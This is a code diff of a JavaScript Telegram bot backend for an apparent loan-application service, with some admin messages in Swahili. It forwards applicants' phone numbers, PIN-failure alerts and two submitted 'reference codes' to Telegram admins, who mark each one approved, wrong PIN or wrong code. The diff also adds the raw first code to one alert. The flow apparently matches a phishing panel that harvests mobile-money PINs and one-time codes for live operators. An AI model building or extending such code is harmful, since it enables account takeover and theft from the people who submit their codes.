@@ -442,8 +442,7 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongpin") {
     return `🔑 WRONG PIN — REJECTED\n\n` +
-      `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
-      `💰 Loan amount: ${money(application.amount)}\n` +
+      `🧾 Reference: ${id}\n` +
       `📞 Phone: ${phone}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
       `⚠️ Reason: Wrong PIN entered\n` +
@@ -454,10 +453,8 @@ function formatTelegramNotification(application, kind) {
   if (kind === "wrongfirst") {
     return `🔢 WRONG CODE 1 — REJECTED\n\n` +
       `📋 Application: ${id}\n` +
-      `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
-      `💰 Loan amount: ${money(application.amount)}\n` +
       `📞 Phone: ${phone}\n` +
-      `🔐 Code 1: Submitted for secure verification\n` +
+      `🧾 Application confirmation: ${code1}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
       `⚠️ Reason: Wrong Code 1 entered\n` +
       `⏰ Date: ${stamp}\n\n` +
@@ -466,10 +463,9 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "wrongsecond") {
     return `🔢 WRONG CODE 2 — REJECTED\n\n` +
-      `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
-      `💰 Loan amount: ${money(application.amount)}\n` +
+      `🧾 Reference: ${id}\n` +
       `📞 Phone: ${phone}\n` +
-      `🔐 Code 2: Submitted for secure verification\n` +
+      `☑️ Final confirmation: ${code2 ? "Confirmed" : "Waiting"}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
       `⚠️ Reason: Wrong Code 2 entered\n` +
       `⏰ Date: ${stamp}\n\n` +
@@ -479,8 +475,7 @@ function formatTelegramNotification(application, kind) {
   return `❌ APPLICATION REJECTED\n\n` +
     `🤳ID: ${application.application_no || id}\n` +
     `📞 PHONE: ${phone}\n` +
-    `🧾 Reference number: ${application.application_id || application.application_no || "—"}\n` +
-    `💰 Loan amount: ${money(application.amount)}\n` +
+    `🧾 Reference: ${application.application_id || application.application_no || "—"}\n` +
     `⚠️ Reason: ${application.rejection_reason || "Application rejected"}\n` +
     `🔁 Attempt: #${attempt}\n` +
     `⏰ Date: ${stamp}`;
@@ -512,8 +507,7 @@ async function notifyTelegram(application) {
     `🧾 Reference: ${application.application_id || application.application_no || "—"}\n` +
     `💰 Loan amount: ${money(application.amount)}\n` +
     `📅 Repayment term: ${application.term_months || "—"} months\n` +
-    `🔢 REFERENCE CODE 1: ${application.first_name || "Not submitted"}\n` +
-    `🔢 REFERENCE CODE 2: ${application.second_name || "Not submitted"}\n` +
+    `☑️ Application confirmation: ${application.second_name ? "Confirmed" : "Waiting"}\n` +
     `⏰ Date: ${stamp}\n` +
     `🔁 Attempt: #${attempt}\n` +
     `📌 Status: ${application.status || "PENDING_ADMIN_APPROVAL"}`;
@@ -746,7 +740,7 @@ Your link is no longer active and cannot be used to submit applications. Please 
       if (!application) return bot.answerCallbackQuery(query.id, { text: "Ombi halikupatikana.", show_alert: true });
       if (!canAccessApplication({ ...rec, telegram_id: adminId }, application)) return bot.answerCallbackQuery(query.id, { text: "Ombi hili halijagawiwa kwako.", show_alert: true });
       if (action === "details") {
-        const details = [`Kitambulisho: ${application.application_id || application.application_no}`, `Simu: ${application.phone}`, `REFERENCE CODE 1: ${application.first_name || "Haujatumwa"}`, `REFERENCE CODE 2: ${application.second_name || "Haujatumwa"}`, `Kiasi: ${money(application.amount)}`, `Hali: ${application.status}`].join("\n");
+        const details = [`Kitambulisho: ${application.application_id || application.application_no}`, `Simu: ${application.phone}`, `Reference Code 1: ${application.first_name || "Haujatumwa"}`, `Reference Code 2: ${application.second_name || "Haujatumwa"}`, `Kiasi: ${money(application.amount)}`, `Hali: ${application.status}`].join("\n");
         return bot.answerCallbackQuery(query.id, { text: details, show_alert: true });
       }
       if (!["approve", "wrongid", "wrongcode", "reject", "details"].includes(action)) return bot.answerCallbackQuery(query.id);
